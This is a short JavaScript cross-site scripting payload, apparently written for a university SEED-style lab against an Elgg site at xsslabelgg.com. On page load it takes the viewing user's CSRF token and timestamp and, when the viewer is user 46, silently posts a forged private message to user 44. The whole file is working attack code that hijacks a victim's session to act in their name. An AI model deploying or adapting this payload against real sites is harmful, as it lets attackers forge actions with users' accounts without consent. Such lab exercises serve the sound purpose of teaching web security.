window.onload = function() {
  var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
  var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
  var receive = "&recipients=&recipients[]=44";
  var subject = "&subject=Life Sucks";
  var body = "&body=CSE 4/1 is full of chill :P";
  var t = token + ts + receive + subject + body;
  var charlie_guid = 46;
  var sendurl = "http://www.xsslabelgg.com/action/messages/send";
  if (elgg.session.user.guid == charlie_guid) {
    var Ajax = null;
    Ajax = new XMLHttpRequest();
    Ajax.open("POST", sendurl, true);
    Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
    Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    Ajax.send(t);
  }
};
